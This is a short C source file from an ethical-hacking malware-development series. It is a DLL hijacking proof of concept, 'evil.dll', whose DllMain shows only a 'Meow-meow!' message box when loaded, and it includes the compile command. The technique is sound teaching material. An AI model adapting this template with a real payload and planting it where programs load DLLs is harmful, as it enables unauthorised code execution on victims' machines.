/*
Malware Development For Ethical Hackers
DLL hijacking example
author: @cocomelonc
*/

// x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
// https://medium.com/@zapbroob9/dll-hijacking-basics-ea60b0f2a1d8

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
      MessageBox(
        NULL,
        "Meow-meow!",
        "=^..^=",
        MB_OK
      );
      break;
    case DLL_PROCESS_DETACH:
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    }
    return TRUE;
}